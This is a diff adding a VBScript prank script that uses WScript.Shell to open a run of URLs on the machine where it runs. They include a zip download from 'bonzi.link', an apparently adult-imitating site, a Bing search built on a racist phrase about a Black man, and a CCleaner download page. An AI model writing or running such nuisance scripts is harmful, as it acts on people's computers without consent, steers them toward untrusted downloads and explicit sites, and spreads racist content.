@@ -1,0 +1,15 @@
+set shl=CreateObject("Wscript.shell")
+shl.run "https://www.bing.com/search?q=what+to+do+when+pc+is+acting+weird"
+  WScript.Sleep 4200
+set shl=CreateObject("Wscript.shell")
+shl.run "http://bonzi.link/Bon.zip"
+  WScript.Sleep 4200
+set shl=CreateObject("Wscript.shell")
+shl.run "https://pourhub.com"
+  WScript.Sleep 4200
+set shl=CreateObject("Wscript.shell")
+shl.run "https://www.bing.com/search?q=why+is+there+a+big+black+man+chasing+me+outside"
+  WScript.Sleep 4200
+set shl=CreateObject("Wscript.shell")
+shl.run "https://www.ccleaner.com/ccleaner/download"
+  WScript.Sleep 4200
